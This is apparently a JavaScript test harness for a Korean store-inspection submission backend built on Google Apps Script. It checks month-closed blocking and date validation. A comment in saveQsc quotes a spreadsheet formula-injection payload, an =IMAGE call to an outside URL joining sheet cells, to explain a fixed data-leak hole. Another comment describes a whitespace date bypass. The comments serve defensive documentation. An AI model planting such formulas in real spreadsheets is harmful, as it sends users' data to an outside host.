
const SPREADSHEET_ID = 'resp', DASHBOARD_ID = '';
const QSC_DETAIL_HEADER = ['점검일자', '방문시간', '매장명', '코드', '문항번호', '구분', '문항', '등급구분', '개선필요건수', '상태', '감점', '비고', '사진', 'NA사유', '제출시각', '제출점수'];
let FILE_ID = 'FILE1', CLOSED = {}, OPEN_THROWS = false;
let PHOTOS = 0, PREPENDS = 0, GUARDS = 0;
function storeFileId() { return FILE_ID; }
function monthClosedAt(ss, tab) { return CLOSED[ss.getId() + ':' + tab] || ''; }
function ssOpen(id) { if (OPEN_THROWS && id !== SPREADSHEET_ID) throw new Error('열기 실패'); return { getId: function () { return id; } }; }   // 매장 파일만 터진다
const SpreadsheetApp = { openById: ssOpen };
function yymm(d) { return d.slice(2, 4) + d.slice(5, 7); }
function ymLabel(ym) { return '20' + ym.slice(0, 2) + '년 ' + Number(ym.slice(2, 4)) + '월'; }
function savePhotos() { PHOTOS++; return {}; }
function sheet(ss, name) { return { _n: name, getDataRange: function () { return { getValues: function () { return [['매장명', 'NA문항', '갱신일']]; } }; },
  appendRow: function () {}, getRange: function () { return { setValues: function () {} }; } }; }
function qscFixHeader() {}
function prependRows() { PREPENDS++; }
function gridForget() {}
function safeRow(r) { return r; }
function round1(n) { return Math.round(n * 10) / 10; }
function normStore(s) { return String(s || '').trim(); }
function dropNaCache() {} function dropDashCache() {} function dropStoreCache() {}
function writeDashboard() { return { ok: true }; }
function writeStoreQsc() { return { ok: true, tickets: 0 }; }
function guardResubmit() { GUARDS++; return null; }
function auditLog() {}
function anonCtx() { return { auth: false }; }
function opErr(w, e) { return w + ': ' + e; }
function err(code, msg) { return { ok: false, code: code, error: msg }; }
let CUR = '2610';                                   // 2026-09-25 검수 · dates-4 — 서버의 이번 달(curYymm)을 시험에서 고른다
function curYymm() { return CUR; }
function qscMonthClosed(store, dateStr) {
  try {
    const id = storeFileId(store);
    if (!id) return null;
    const tab = yymm(dateStr);
    if (!monthClosedAt(ssOpen(id), tab)) return null;
    return { ok: false, code: 'MONTH_CLOSED', error: ymLabel(tab) + ' 채점이 확정되어 제출할 수 없습니다.' };
  } catch (e) { return null; }
}
function saveQsc(ss, p, ctx) {
  /* ★확정된 달은 사진을 올리기 전에 끊는다★ (②-3h) — fnQscSubmit 이 먼저 봤지만 saveQsc 를 따로 부르는 길(시험·사본)도 같은 문을 지난다 */
  const closed = qscMonthClosed(p.store, p.date);
  if (closed) return closed;
  const photoMap = savePhotos(p, ctx); // {문항no: [{url, id}]}
  // v3.7 절대 감점제 스키마: 대분류 점수 대신 감점 3층 + 중대 차감 기록
  // 맨 뒤 '계정' 칸은 누가 제출했는지 남기기 위한 것 — p.inspector는 자유 입력이라 검증할 방법이 없다
  const sum = sheet(ss, 'QSC_회차', ['제출시각', '점검일자', '방문시간', '매장명', '점검자', 'QSC점수', '등급',
    '일반감점', '★차감', '★★차감', '중대차감합계', '응답수', '사진수', '계정']);
  const r = p.result || {};
  let photoN = 0;
  p.items.forEach(function (it) { photoN += (photoMap[it.no] || []).length; });
  /* ★최신이 맨 위★ (2026-09-10) — MS_상세와 같은 방향으로 맞췄다.
     이 시트를 「끝에서부터」 읽던 곳은 submittedStores 하나뿐이고, 그 자리에 fromTop 을 켰다. */
  prependRows(sum, [safeRow([p.submittedAt, p.date, p.time || '', p.store, p.inspector,
    r.qsc == null ? '' : round1(r.qsc), r.grade || '',
    r.genDeduct || 0, (r.s2 && r.s2.deduct) || 0, (r.s1 && r.s1.deduct) || 0, r.criticalDeduct || 0,
    p.items.filter(function (it) { return it.value !== null; }).length, photoN,
    ctx ? ctx.id : ''])]);

  /* ★13번째 '사진' 칸 앞에는 아무것도 끼우지 않는다★ (2026-08-27) — fnUndoSubmit 이 그 자리를
     열 번호 13 으로 직접 읽어 사진 ID를 모은다. 밀리면 되돌리기가 사진을 못 찾고, 지워야 할
     사진이 드라이브에 영영 남는다. ★새 칸은 반드시 맨 뒤에 붙인다.★
     ⚠2026-09-10 에 '제출시각'·'제출점수' 를 15·16 에 붙였다(담당자: "MS_상세 참고하여 열 추가").
       MS_상세와 달리 앞쪽에 끼우지 않은 것은 위 사진 칸 때문이다. */
  const det = sheet(ss, 'QSC_상세', QSC_DETAIL_HEADER.slice(0));
  qscFixHeader(det);
  const rows = p.items
    .filter(function (it) { return it.value !== null; })
    .map(function (it) {
      const sev = it.severity === 'S1' ? '★★' : it.severity === 'S2' ? '★' : '';
      return safeRow([p.date, p.time || '', p.store, it.code || '', it.no, it.group || '', it.text, sev,
        String(it.value), it.rating || '', it.deduct == null ? '' : -it.deduct,
        it.memo || '', (photoMap[it.no] || []).map(function (x) { return x.url; }).join('\n'),
        it.value === 'NA' ? String(it.naWhy || '해당 없음') : '',
        /* 15·16 : 제출 단위 (74줄에 같은 값이 반복된다 — MS_상세 10·12 열과 같은 뜻) */
        p.submittedAt, r.qsc == null ? '' : round1(r.qsc)]);
    });
  prependRows(det, rows);

  // 매장별 NA 프리셋 갱신 — 다음 회차에 앱이 자동 제안 (config.get으로 내려감)
  try {
    const naSheet = sheet(ss, 'NA프리셋', ['매장명', 'NA문항', '갱신일']);
    /* ★it.no는 클라이언트가 정하는 값이다★ — 종전에는 그것을 그대로 join해 만든 문자열을
       safe() 없이 setValues로 넣었다(이미 한 번 제출된 매장은 found>0 경로를 탄다).
       그래서 items:[{no:'=IMAGE("https://…"&JOIN(",",QSC_상세!L2:L200))', value:'NA'}] 한 건이면
       QSC 응답 파일에 자동 페치 수식이 심어지고, 그 셀 값은 naPresets()로 읽혀 config.get
       응답에 실려 전 사용자에게 되돌아간다. 방어를 둘 겹친다: ①문항번호는 정수만 통과시키고
       ②그렇게 만든 문자열도 safe()를 거친다. */
    /* ★'해당 없음' 만 기억한다★ (2026-08-27 담당자 결정: "1만해")
       '본사 대기' 는 본사가 고치면 없어지고, '확인 불가' 는 그때뿐이다.
       그것까지 다음 달에 자동으로 제안하면, 점검자가 「본사가 아직인가?」를 안 보고 넘긴다.
       ⚠사유가 안 실려 온 옛 앱의 제출은 '해당 없음' 으로 본다(종전 동작 유지). */
    const naNos = p.items.filter(function (it) {
      if (it.value !== 'NA') return false;
      const why = String(it.naWhy || '해당 없음');
      if (why !== '해당 없음') return false;
      return typeof it.no === 'number' && isFinite(it.no) && it.no === Math.floor(it.no);
    }).map(function (it) { return it.no; }).join(',');
    const vals = naSheet.getDataRange().getValues();
    let found = -1;
    for (let i = 1; i < vals.length; i++) {
      if (normStore(vals[i][0]) === normStore(p.store)) { found = i + 1; break; }
    }
    if (found > 0) naSheet.getRange(found, 2, 1, 2).setValues([safeRow([naNos, p.date])]);
    else { naSheet.appendRow(safeRow([p.store, naNos, p.date])); gridForget(naSheet); }
    dropNaCache();   // 방금 고쳤으니 캐시를 버린다 (안 그러면 10분간 옛 프리셋을 제안한다)
  } catch (err) { /* 프리셋 실패는 저장에 영향 없음 */ }

  // ②③ 연동 기록 — 실패해도 원본 저장은 유지하고 결과만 알림
  const extra = { dashboard: null, storeFile: null };
  if (DASHBOARD_ID) {
    try {
      extra.dashboard = p.result.final == null ? { ok: false, error: '점수 없음' }
        : writeDashboard(p.store, p.date, p.result.final / 100, 0);
    } catch (err) { extra.dashboard = { ok: false, error: opErr('통합시트 기록', err) }; }
    /* ★두 catch 를 나눠 둔다★ — 합치면 매장 파일 실패가 성공한 통합시트 결과를 덮어써
       원인을 잘못 보게 된다. */
    try { extra.storeFile = writeStoreQsc(p, photoMap); }
    catch (err) { extra.storeFile = { ok: false, error: opErr('매장 파일 기록', err) }; }
  }
  dropDashCache(p.date);
  dropStoreCache(p.store, yymm(p.date));   // 방금 쓴 매장·달의 조회 캐시도 함께 비운다
  const out = { ok: true, saved: rows.length, photos: photoN, dashboard: extra.dashboard, storeFile: extra.storeFile };
  if (photoMap.__skipped) {
    out.photosSkipped = photoMap.__skipped;
    if (photoMap.__why) out.photosWhy = photoMap.__why;
    /* 조용히 사라지면 아무도 모른다 — 담당자가 볼 수 있는 곳에 남긴다 */
    /* 2026-09-25 검수 · field-7 — 이유가 있으면 이유를(하루 상한 등), 없을 때만 종전 문구 */
    auditLog(ctx || anonCtx(), 'qsc.submit', p.store, '경고', 'PHOTO_SKIPPED',
      '저장하지 않은 사진 ' + photoMap.__skipped + '장 — ' + (photoMap.__why || '용량·형식이 맞지 않음'));
  }
  return out;
}
function fnQscSubmit(ctx, payload) {
  const badDate = submitDateGate(payload && payload.date);   // 2026-09-25 검수 · dates-4 — 날짜가 탭을 정하므로 무엇보다 먼저
  if (badDate) return badDate;
  const ss = ssOpen(SPREADSHEET_ID);
  /* ★확정된 달은 여기서 끝낸다★ (2026-09-17 담당자 ②-3h) — 되묻기(guardResubmit)·사진·응답 시트 어디에도 닿기 전에.
     같은 판정을 saveQsc(사진 올리기 전)·writeStoreQscInto(매장 파일에 쓰기 직전)가 한 번 더 한다. */
  const closed = qscMonthClosed(payload && payload.store, payload && payload.date);
  if (closed) return closed;
  /* ★앞 제출을 정리하며 한 일을 화면까지 올려 보낸다★ (2026-08-27) — 종전에는 이 목록을
     통째로 버렸다. 그래서 '개선요청 N행은 손으로 지우십시오' 같은 말이 서버에서만 맴돌고
     사람에게는 '저장 완료'만 보였다. 조용한 실패가 이 앱이 가장 싫어하는 것이다. */
  const undone = [];
  const stop = guardResubmit(ss, 'qsc', payload, ctx, undone);
  if (stop) return stop;
  const out = saveQsc(ss, payload, ctx);
  if (out && out.ok && undone.length) out.undone = undone;
  return out;
}
function submitDateGate(dateStr, word) {
  const w = word || '점검일자';
  /* 2026-09-25 검수 · backend-2/security-1 — trim 하지 않는다. 뒤따르는 qscMonthClosed·yymm·저장은 원래 값을 쓰므로
     ' 2026-10-20' 이 문을 지나면 탭 '02-1' 을 보아 확정 달 검사를 비켜 갔다. 앱 date 입력은 공백이 없다. */
  const d = String(dateStr == null ? '' : dateStr);
  const ym = /^\d{4}-\d{2}-\d{2}$/.test(d) ? yymm(d) : '';
  const day = Number(d.slice(8, 10));
  if (!ym || !validYm(ym) || !(day >= 1 && day <= 31)) return err('BAD_REQUEST', w + '를 선택해 주세요.');
  if (ym < '2610') return err('BAD_REQUEST', Number(ym.slice(2, 4)) + '월은 앱으로 제출할 수 없습니다 — ' + w + '를 확인해 주세요.');
  const cur = curYymm();
  if (cur >= '2610' && ym > cur) return err('BAD_REQUEST', '아직 오지 않은 달입니다 — ' + w + '를 확인해 주세요.');
  return null;
}
function validYm(ym) {
  if (!/^\d{4}$/.test(String(ym))) return false;
  const m = Number(String(ym).slice(2, 4));
  return m >= 1 && m <= 12;
}
var submitDateGate = submitDateGate || function () { return null; };   // 옛 사본(대조군)에는 날짜 문이 없다

let pass = 0, fail = 0;
function ok(name, cond, info) { if (cond) { pass++; console.log('  ✓ ' + name); } else { fail++; console.log('  ✗ ' + name + (info !== undefined ? '  ← ' + JSON.stringify(info) : '')); } }
function payload() {
  return { store: '금종제과', date: '2026-10-05', time: '10:00', submittedAt: '2026-10-05T01:00:00Z', inspector: '신문수',
    items: [{ no: 1, code: 'A-01', text: '문항', value: '0' }, { no: 2, code: 'A-02', text: '문항', value: 'NA', naWhy: '해당 없음' }],
    result: { qsc: 99, grade: '우수', final: 99, genDeduct: 1 } };
}
function reset() { PHOTOS = 0; PREPENDS = 0; GUARDS = 0; CLOSED = {}; FILE_ID = 'FILE1'; OPEN_THROWS = false; }
const ctx = { auth: true, id: 'admin', role: '관리자' };

console.log('① 확정된 달 — fnQscSubmit');
reset(); CLOSED['FILE1:2610'] = '2026-11-02';
let r = fnQscSubmit(ctx, payload());
ok('MONTH_CLOSED', r.ok === false && r.code === 'MONTH_CLOSED', r);
ok('문구 「2026년 10월 채점이 확정되어 제출할 수 없습니다.」', r.error === '2026년 10월 채점이 확정되어 제출할 수 없습니다.', r.error);
ok('★사진을 올리지 않았다★', PHOTOS === 0, PHOTOS);
ok('★응답 시트에 한 줄도 안 썼다★', PREPENDS === 0, PREPENDS);
ok('되묻기에도 안 갔다', GUARDS === 0, GUARDS);

console.log('② saveQsc 를 바로 불러도 사진 전에 끊는다');
reset(); CLOSED['FILE1:2610'] = '2026-11-02';
r = saveQsc({}, payload(), ctx);
ok('MONTH_CLOSED · 사진 0 · prepend 0', r.code === 'MONTH_CLOSED' && PHOTOS === 0 && PREPENDS === 0, [r.code, PHOTOS, PREPENDS]);

console.log('③ 확정 안 된 달');
reset();
r = fnQscSubmit(ctx, payload());
ok('저장된다', r.ok === true && r.saved === 2, r);
ok('사진 1회 · 회차+상세 prepend 2회 · 되묻기 1회', PHOTOS === 1 && PREPENDS === 2 && GUARDS === 1, [PHOTOS, PREPENDS, GUARDS]);
reset(); CLOSED['FILE1:2611'] = '2026-12-02';     // 다른 달만 확정
r = fnQscSubmit(ctx, payload());
ok('다른 달 확정은 무관', r.ok === true, r);

console.log('④ 판정할 수 없으면 막지 않는다');
reset(); FILE_ID = null; CLOSED['FILE1:2610'] = '2026-11-02';
ok('매장 파일 없음 → 저장(writeStoreQsc 가 알린다)', fnQscSubmit(ctx, payload()).ok === true);
reset(); OPEN_THROWS = true; CLOSED['FILE1:2610'] = '2026-11-02';
ok('매장 파일 열기 실패 → 저장', fnQscSubmit(ctx, payload()).ok === true);

console.log('⑤ 점검일자 문 (2026-09-25 검수 · dates-4) — 무엇보다 먼저 · 사진·응답 시트·되묻기 전에');
function withDate(d) { const p = payload(); p.date = d; return p; }
function untouched() { return PHOTOS === 0 && PREPENDS === 0 && GUARDS === 0; }
reset(); CUR = '2610';
r = fnQscSubmit(ctx, withDate(''));
ok('빈 날짜 → BAD_REQUEST 「점검일자를 선택해 주세요.」', r.code === 'BAD_REQUEST' && r.error === '점검일자를 선택해 주세요.', r);
ok('빈 날짜 — 아무것도 안 건드렸다', untouched(), [PHOTOS, PREPENDS, GUARDS]);
reset();
ok('형식 틀림(2026-10-5) → 같은 문구', fnQscSubmit(ctx, withDate('2026-10-5')).error === '점검일자를 선택해 주세요.');
ok('없는 달(2026-00-10) → 같은 문구', fnQscSubmit(ctx, withDate('2026-00-10')).error === '점검일자를 선택해 주세요.');
ok('날짜 아닌 값(숫자) → 같은 문구', fnQscSubmit(ctx, withDate(20261005)).error === '점검일자를 선택해 주세요.');
reset();
r = fnQscSubmit(ctx, withDate('2026-09-30'));
ok('9월(낡은 임시저장) → 「9월은 앱으로 제출할 수 없습니다 — 점검일자를 확인해 주세요.」', r.code === 'BAD_REQUEST' && r.error === '9월은 앱으로 제출할 수 없습니다 — 점검일자를 확인해 주세요.', r);
ok('9월 — ★9월 수기 탭에 닿기 전★ 아무것도 안 건드렸다', untouched(), [PHOTOS, PREPENDS, GUARDS]);
reset();
r = fnQscSubmit(ctx, withDate('2026-11-02'));
ok('10월에 11월 날짜 → 「아직 오지 않은 달입니다 — 점검일자를 확인해 주세요.」', r.code === 'BAD_REQUEST' && r.error === '아직 오지 않은 달입니다 — 점검일자를 확인해 주세요.', r);
ok('미래 달 — 아무것도 안 건드렸다(11월 탭을 미리 만들지 않는다)', untouched(), [PHOTOS, PREPENDS, GUARDS]);
reset(); CUR = '2611';
ok('11/1 에 10/31 점검 제출(지난 달) → 통과', fnQscSubmit(ctx, withDate('2026-10-31')).ok === true);
reset(); CUR = '2610';
ok('같은 달(10/5) → 통과', fnQscSubmit(ctx, withDate('2026-10-05')).ok === true);
reset(); CUR = '2609';
ok('★10/1 전(서버 달 2609)에는 미래 달(12월 시험)을 막지 않는다★', fnQscSubmit(ctx, withDate('2026-12-01')).ok === true);
ok('10/1 전에도 9월 날짜는 막는다', fnQscSubmit(ctx, withDate('2026-09-25')).code === 'BAD_REQUEST');
reset(); CUR = '2610'; CLOSED['FILE1:2610'] = '2026-11-02';
ok('확정된 달은 종전대로 MONTH_CLOSED(날짜 문 통과 뒤)', fnQscSubmit(ctx, payload()).code === 'MONTH_CLOSED');
CUR = '2610';

console.log('\n' + (fail ? '실패 ' + fail + '개' : '전부 통과') + '  (통과 ' + pass + ')');
process.exit(fail ? 1 : 0);
